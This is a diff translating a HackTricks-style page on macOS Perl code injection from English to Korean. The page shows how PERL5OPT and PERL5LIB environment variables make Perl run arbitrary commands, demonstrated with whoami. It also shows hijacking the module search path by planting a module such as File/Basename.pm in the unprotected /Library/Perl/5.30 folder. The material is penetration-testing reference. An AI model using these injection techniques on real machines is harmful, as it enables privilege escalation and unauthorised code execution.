@@ -2,48 +2,37 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## `PERL5OPT` 및 `PERL5LIB` 환경 변수를 통한 방법
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
-
+환경 변수 PERL5OPT를 사용하면 perl이 임의의 명령을 실행하도록 할 수 있습니다.\
+예를 들어, 이 스크립트를 생성합니다:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-
-Now **export the env variable** and execute the **perl** script:
-
+이제 **환경 변수를 내보내고** **perl** 스크립트를 실행합니다:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
-
+또 다른 옵션은 Perl 모듈을 만드는 것입니다 (예: `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-
-And then use the env variables:
-
+그리고 env 변수를 사용하세요:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
-
 ## Via dependencies
 
-It's possible to list the dependencies folder order of Perl running:
-
+Perl 실행의 의존성 폴더 순서를 나열할 수 있습니다:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+다음과 같은 결과를 반환합니다:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -55,15 +44,14 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
+반환된 폴더 중 일부는 존재하지 않지만, **`/Library/Perl/5.30`**는 **존재**하며, **SIP**에 의해 **보호되지** 않고 **SIP**에 의해 **보호되는** 폴더보다 **앞에** 있습니다. 따라서 누군가 그 폴더를 악용하여 스크립트 종속성을 추가할 수 있으며, 그러면 높은 권한의 Perl 스크립트가 이를 로드할 것입니다.
 
 > [!WARNING]
-> However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
+> 그러나, 그 폴더에 쓰기 위해서는 **root 권한이 필요**하며, 요즘에는 이 **TCC 프롬프트**가 표시됩니다:
 
 <figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+예를 들어, 스크립트가 **`use File::Basename;`**를 가져오고 있다면, `/Library/Perl/5.30/File/Basename.pm`을 생성하여 임의의 코드를 실행할 수 있습니다.
 
 ## References
 
